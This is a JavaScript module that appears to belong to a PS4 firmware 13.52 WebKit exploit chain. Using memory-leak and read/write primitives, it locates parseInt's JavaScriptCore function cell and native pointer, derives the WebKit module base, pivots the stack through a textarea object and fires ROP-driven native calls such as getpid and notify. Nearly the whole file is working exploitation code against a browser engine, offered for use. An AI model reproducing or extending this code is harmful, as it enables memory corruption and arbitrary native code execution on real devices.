/**
 * PS4 13.52 native call — parseInt + carrier textarea (slopkit-core anchors).
 * Prefer carrier.native @ READ-PRIMITIVE-PASS; live scan is fallback only.
 */
import { int64 } from "./int64.js";
import {
    prepNativeChain, layoutSmokeStack, fireNativeCall, firePivotSmoke,
    stageGetpid, stageNotify, firePivotTrigger,
    verifySlabContent, verifyBisectChainSet,
} from "./native_call.js?v=nc-20250831r";
import { resolveG0GetpidStubOff, getpidRetOk } from "./stub_g0_fire.js?v=stub-g0-8";

const M_FUNCTION_OFF = 0x28;
const JSFUNC_EXECUTABLE_OFF = 0x18;
const CORE_NATIVE_SS = "wk-core-native";

function ptrBig(p) {
    return (BigInt(p.hi >>> 0) << 32n) | BigInt(p.low >>> 0);
}

/** core.plausibleAddress — code or heap pointer, not hi>=0x80. */
function plausibleAddress64(p) {
    if (!p) return false;
    const v = ptrBig(p);
    return v > 0x100000000n && v <= 0xffffffffffffn;
}

/** JSC heap cell — mem.leakval / core.plausibleCell (0x2… valid). */
function plausibleCell64(p) {
    if (!p) return false;
    if (p.hi > 0xffff) return false;
    if (p.low === 0 && p.hi === 0) return false;
    if ((p.low & 7) !== 0) return false;
    return plausibleAddress64(p);
}

function codeLooksNative(code4) {
    return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
}

function plausibleNativeFn64(p, ptr, read4) {
    if (!plausibleAddress64(ptr)) return false;
    if (ptr.hi >= 0x80 && ptr.hi <= 0x8f) return true;
    if (p && read4) {
        try {
            const q = read4(p, ptr);
            if (codeLooksNative(q)) return true;
        } catch (_) { }
    }
    return ptr.hi >= 0x8;
}

function plausibleModuleBase(p) {
    if (!plausibleAddress64(p)) return false;
    return p.hi >= 0x80 && p.hi <= 0x8f && (p.low & 0x3fff) === 0;
}

function numToI64(n) {
    if (n == null) return null;
    if (typeof n === "object" && n != null && "low" in n)
        return new int64(n.low >>> 0, (n.hi >>> 0));
    if (typeof n === "string") {
        const s = n.replace(/^0x/i, "").trim();
        if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
        if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
        if (s.length < 16) return new int64(parseInt(s.slice(-8), 16) >>> 0, 0);
        return new int64(
            parseInt(s.slice(-8), 16) >>> 0,
            parseInt(s.slice(0, -8), 16) >>> 0);
    }
    if (!Number.isFinite(n) || n <= 0) return null;
    return new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
}

function read4p(p, addr) {
    try {
        const v = p.read4(addr);
        if (v == null) return null;
        return (v.low >>> 0) | ((v.hi >>> 0) * 0x100000000);
    } catch (_) {
        return null;
    }
}

function loadStoredNative() {
    try {
        const raw = sessionStorage.getItem(CORE_NATIVE_SS);
        if (!raw) return null;
        const j = JSON.parse(raw);
        if (!j) return null;
        const exec = numToI64(j.executable);
        const targetCell = numToI64(j.targetCell);
        if (!exec || !targetCell) return null;
        return {
            target: parseInt,
            targetCell: j.targetCell,
            executable: j.executable,
            nativeFn: j.nativeFn,
            textareaCell: j.textareaCell,
            holderCell: j.holderCell,
            _src: "sessionStorage",
        };
    } catch (_) {
        return null;
    }
}

function nativeFromCarrier(carrier) {
    if (!carrier) return null;
    if (carrier.native) {
        const exec = numToI64(carrier.native.executable);
        const tc = numToI64(carrier.native.targetCell);
        if (exec && tc)
            return Object.assign({ _src: "carrier.native" }, carrier.native);
    }
    return loadStoredNative();
}

function capFromAnchors(p, carrier, nat, read4) {
    const exec = numToI64(nat.executable);
    const targetCell = numToI64(nat.targetCell);
    if (!exec || !targetCell) return null;

    const textarea = carrier && carrier.textarea;
    if (!textarea) return null;

    const mainMf = exec.add32(M_FUNCTION_OFF);
    let mainOrig = numToI64(nat.nativeFn);
    if (!mainOrig || !plausibleNativeFn64(p, mainOrig, read4)) {
        try { mainOrig = p.read8(mainMf); } catch (_) { return null; }
    }
    if (!plausibleNativeFn64(p, mainOrig, read4)) return null;

    let pivotCell;
    try { pivotCell = p.leakval(textarea); } catch (_) {
        pivotCell = numToI64(nat.textareaCell || carrier.textareaAddress);
        if (!pivotCell) return null;
    }

    return {
        mainMf,
        mainOrig,
        nativeFn: mainOrig,
        pivotTrigger: parseInt,
        pivotBuiltinName: "parseint-" + (nat._src || "carrier"),
        path: "anchors-" + (nat._src || "carrier"),
        cell: targetCell,
        pivotObj: textarea,
        pivotCell,
        textarea,
    };
}

/** Live walk — only if carrier.native missing. */
export function captureParseIntLive(p, carrier) {
    if (!p || typeof p.leakval !== "function")
        return { err: "no-p" };
    const textarea = carrier && carrier.textarea;
    if (!textarea)
        return { err: "no-textarea-on-carrier" };

    let targetCell;
    try { targetCell = p.leakval(parseInt); } catch (e) {
        return { err: "leakval(parseInt): " + (e && e.message ? e.message : e) };
    }
    if (!plausibleCell64(targetCell))
        return { err: "bad-parseInt-cell=" + targetCell };

    let exec;
    try { exec = p.read8(targetCell.add32(JSFUNC_EXECUTABLE_OFF)); } catch (e) {
        return { err: "read exec@+0x18: " + (e && e.message ? e.message : e) };
    }
    if (!plausibleCell64(exec))
        return { err: "bad-exec-ptr=" + exec };

    const mainMf = exec.add32(M_FUNCTION_OFF);
    let mainOrig;
    try { mainOrig = p.read8(mainMf); } catch (e) {
        return { err: "read m_function: " + (e && e.message ? e.message : e) };
    }
    if (!plausibleNativeFn64(p, mainOrig, read4p))
        return { err: "bad-native-fn=" + mainOrig + "@+" + M_FUNCTION_OFF.toString(16) };

    let pivotCell;
    try { pivotCell = p.leakval(textarea); } catch (e) {
        const ta = numToI64(carrier.textareaAddress);
        if (!ta) return { err: "leakval(textarea) failed" };
        pivotCell = ta;
    }

    return {
        cap: {
            mainMf,
            mainOrig,
            nativeFn: mainOrig,
            pivotTrigger: parseInt,
            pivotBuiltinName: "parseint-live",
            path: "live-parseInt-scan",
            cell: targetCell,
            pivotObj: textarea,
            pivotCell,
            textarea,
        },
    };
}

export function captureFromCarrier(p, carrier, off) {
    const nat = nativeFromCarrier(carrier);
    if (nat) {
        const anchored = capFromAnchors(p, carrier, nat, read4p);
        if (anchored) return anchored;
    }

    const live = captureParseIntLive(p, carrier);
    if (live.cap) return live.cap;

    return null;
}

function loadSessionWebkitBase() {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (!raw) return null;
        return numToI64(String(raw).replace(/^0x/i, ""));
    } catch (_) {
        return null;
    }
}

export function webkitBaseFromCap(cap, off) {
    if (!cap || !cap.nativeFn || !off) return null;
    const rva = off.wk_parseint_native || off.wk_expm1_builtin;
    if (!rva) return null;
    const base = cap.nativeFn.sub32(rva);
    if (!plausibleModuleBase(base)) return null;
    return base;
}

function resolveWebkitBaseForCore(cap, off) {
    const sess = loadSessionWebkitBase();
    if (sess && plausibleModuleBase(sess)) return sess;
    const fromCap = webkitBaseFromCap(cap, off);
    if (fromCap) return fromCap;
    if (cap && cap.nativeFn && off && off.wk_expm1_builtin) {
        const b = cap.nativeFn.sub32(off.wk_expm1_builtin);
        if (plausibleModuleBase(b)) return b;
    }
    return null;
}

export function prepCoreNative(p, off, carrier, opts) {
    opts = opts || {};
    const cap = captureFromCarrier(p, carrier, off);
    if (!cap) {
        const live = captureParseIntLive(p, carrier);
        throw new Error("core_native: " + (live.err || "parseInt anchors missing"));
    }
    return finishCorePrep(p, off, carrier, cap);
}

function finishCorePrep(p, off, carrier, cap) {
    if (!cap.pivotObj)
        throw new Error("core_native: carrier textarea missing");
    const webkitBase = resolveWebkitBaseForCore(cap, off);
    if (!webkitBase)
        throw new Error("core_native: webkit base bad fn=" + cap.nativeFn
            + " (Start should log WEBKIT-BASE — tap Save bases)");

    cap.pivotTrigger = cap.pivotTrigger || parseInt;
    const prep = prepNativeChain(p, off, webkitBase, cap);
    prep.pivotObj = cap.pivotObj;
    prep.pivotCell = cap.pivotCell || p.leakval(cap.pivotObj);
    prep._coreNative = true;
    prep._cap = cap;
    if (prep.keepAlive.indexOf(cap.pivotObj) < 0)
        prep.keepAlive.push(cap.pivotObj);
    if (carrier.textarea && prep.keepAlive.indexOf(carrier.textarea) < 0)
        prep.keepAlive.push(carrier.textarea);
    return prep;
}

export function verifyCoreChain(p, prep, off) {
    const wb = prep.webkitBase;
    if (!wb) return { ok: false, reason: "no webkitBase" };
    const v = verifyBisectChainSet(a => p.read1(a), wb, off);
    return { ok: v.ok, pivot: v.pivot, popBad: v.popBad };
}

export function fireCoreSmoke(p, prep, off, hookMode) {
    layoutSmokeStack(prep);
    const c = verifySlabContent(p, prep);
    if (!c.ok) throw new Error("core smoke slab: " + c.reasons.join("; "));
    return firePivotSmoke(p, prep, off, {
        hook: hookMode || "cell30",
        carrier: window._wkCarrier || null,
    });
}

export function fireCoreGetpid(p, prep, lk, off, hookMode, opts) {
    opts = opts || {};
    const stub = resolveG0GetpidStubOff(off, opts);
    const fireOpts = { hook: hookMode || "cell30", carrier: window._wkCarrier || null };
    stageGetpid(p, prep, lk, off, stub.stubOff, fireOpts);
    const ret = fireNativeCall(p, prep, off, fireOpts);
    return {
        ret,
        pid: stub.mode === "raw" ? ret : null,
        mode: stub.mode,
        ok: getpidRetOk(ret, stub.mode),
        stubOff: stub.stubOff,
    };
}

export function fireCoreNotify(p, prep, lk, off, hookMode, message) {
    const opts = { hook: hookMode || "cell30", carrier: window._wkCarrier || null };
    stageNotify(p, prep, lk, off, { message });
    return fireNativeCall(p, prep, off, opts);
}

export function bisectCoreTriggerLite(p, prep) {
    if (!prep.mainArmed && prep.mainMf && prep.G) {
        p.write8(prep.mainMf, prep.G.G0);
        prep.mainArmed = true;
    }
    firePivotTrigger(prep, 1);
}
